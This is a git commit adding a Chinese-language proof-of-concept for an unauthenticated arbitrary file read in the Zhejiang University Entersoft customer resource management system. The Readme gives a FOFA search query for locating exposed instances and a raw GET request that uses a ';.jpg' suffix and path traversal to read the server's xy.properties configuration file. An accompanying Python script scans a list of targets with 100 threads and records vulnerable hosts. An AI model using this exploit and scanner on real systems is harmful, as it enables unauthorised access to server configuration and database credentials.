012dde153735f2ac9244dfce0422a611afcd7f8f
hardog123 <3331551889@qq.com>
2024-06-15 18:17:50 +0800

    Add files via upload

---
+++ POC/浙大恩特客户资源管理系统 i0004_openFileByStream.jsp 任意文件读取漏洞/Readme.md
@@ -0,0 +1,28 @@
+# 浙大恩特客户资源管理系统 i0004_openFileByStream.jsp 任意文件读取漏洞
+
+## 1.漏洞描述
+
+浙大恩特客户资源管理Q系统是一款外贸管理软件，它提供了多种功能，包括客户档案管理、邮件管理、OA外贸办公管理系统、分管权限管理、联系跟进及提醒、业务检查管理、统计分析管理等。
+
+浙大恩特客户资源管理系统存在任意文件读取漏洞。未授权的攻击者可以通过该漏洞读取服务器任意文件，从而获取大量敏感信息。
+
+## 2.搜索语法
+
+```plain
+fofa：title="欢迎使用浙大恩特客户资源管理系统"
+```
+
+## 3.漏洞复现
+
+```plain
+GET /entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan HTTP/1.1
+Host: 127.0.0.1
+Accept-Encoding:gzip,deflate,br
+Accept:*/*
+Accept-Language:en-US;q=0.9,en;q=0.8
+User-Agent:Mozilla/5.0(WindowsNT 10.0: Win64:x64)AppleWebKit/537.36(KHTML, likeGecko) Chrome/116.0.5845.111 Safari/537.36
+Connection:close
+Cache-Control:max-age=0
+```
+
+![image-20240615181702747](D:\py\POC\浙大恩特客户资源管理系统 i0004_openFileByStream.jsp 任意文件读取漏洞\image-20240615181702747.png)
---
+++ POC/浙大恩特客户资源管理系统 i0004_openFileByStream.jsp 任意文件读取漏洞/浙大恩特客户资源管理系统 任意文件读取漏洞.py
@@ -0,0 +1,75 @@
+import sys,requests,time,argparse
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+# 定义程序的横幅
+def banner():
+    test = """
+
+ ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
+▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
+▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
+░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
+░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
+ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
+ ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
+ ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
+                            ░                       
+                                       
+                            version:1.1.0
+                            author:Hardog                                    
+"""
+    print(test)
+
+# 主函数，解析命令行参数并调用相应的功能函数
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="浙大恩特客户资源管理系统 任意文件读取漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
+    args = parser.parse_args()
+
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip().replace('\n',''))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+
+# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
+def poc(target):
+    payload_url = '/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan'
+    url = target + payload_url
+    headers = {
+        'Accept-Encoding':'gzip,deflate,br',
+        'Accept':'*/*',
+        'Accept-Language':'en-US;q=0.9,en;q=0.8',
+        'User-Agent':'Mozilla/5.0(WindowsNT 10.0:Win64:x64)AppleWebKit/537.36(KHTML, likeGecko) Chrome/116.0.5845.111 Safari/537.36',
+        'Connection':'close',
+        'Cache-Control':'max-age=0'
+    }
+    
+    try:
+        res = requests.get(url=url,headers=headers,timeout=5,verify=False)
+        
+        if res.status_code == 200 and "db" in res.text:
+            print(f"[+]该网站存在任意文件读取漏洞，url为{target}")
+            with open("result.txt","a",encoding="utf-8") as fp:
+                fp.write(target+'\n')
+        else:
+            print(f"[-]该网站不存在任意密码读取漏洞")
+
+    except Exception as e:
+        print(f"[*]该网站无法访问")
+
+# 程序入口点
+if __name__ == '__main__':
+    main()
